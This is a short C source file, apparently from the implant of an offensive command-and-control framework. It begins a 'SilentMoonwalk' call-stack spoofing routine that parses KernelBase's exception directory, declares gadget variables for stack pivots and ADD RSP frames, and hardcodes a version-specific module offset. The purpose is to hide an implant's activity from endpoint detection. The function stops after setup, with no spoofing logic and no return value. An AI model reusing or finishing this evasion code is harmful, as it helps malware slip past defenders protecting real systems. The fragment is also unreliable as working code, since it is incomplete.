#include "../../../../headers/agent/evasion/StackSpoof/SilentMoonwalk.h"
#include "../../../../headers/agent/evasion/StackSpoof/Functions.h"
#include "../../../../headers/agent/evasion/StackSpoof/Spoof.h"
#include "../../../../headers/agent/agent.h"
#include "../../../../headers/agent/evasion/PeParsing/evasive.h"
#include "../../../../headers/cstdreplacement/localcstd.h"
#include <intrin.h>

SPOOFER sConfig;
PVOID returnAddress;

BOOL SilentMoonwalkMain(PVOID FunctionPointer, PArgs args)
{
    PERF                pRuntimeFunctionTable;
    PERF                rtFunction;
    DWORD               runtimeFunctionTableSize;
    DWORD               rtLastIndex;
    DWORD               rtSaveIndex;
    DWORD               stackSize;
    DWORD               stackOffsetWhereRbpIsPushed;
    DWORD64             rtTargetOffset;
    HMODULE             kernel32Base = agent->apis->hKernel32;
    HMODULE             kernelBase = agent->apis->hKernelBase;
    HMODULE             ntdllBase = agent->apis->hNtdll;
    PUNWIND_INFO        unwindInfo;
    BOOL                status;
    BOOL                checkpoint;
    HMODULE             msvcrt;
    HMODULE             user32;
    HMODULE             shell32;
    DWORD               addRspGadget;
    DWORD               skip_jmp_gadget = 0;
    DWORD               skip_stack_pivot_gadget = 0;
    DWORD               skip_prolog_frame = 0;
    DWORD               skip_pop_rsp_frame = 0;


    pRuntimeFunctionTable = (PERF)GetExceptionDirectoryAddress(kernelBase, &runtimeFunctionTableSize);
    rtLastIndex = (DWORD)(runtimeFunctionTableSize/12);
    rtSaveIndex = 0;
    stackSize = 0;
    rtTargetOffset = 0;
    status = 0;
    checkpoint = 0;
    addRspGadget = ADD_RSP_0x38;

    MemorySet(&sConfig, 0, sizeof(SPOOFER));

    sConfig.KernelBaseAddress = (PVOID)kernelBase;
    sConfig.KernelBaseAddressEnd = (PVOID)((UINT64)kernelBase + 0x368cc4);


}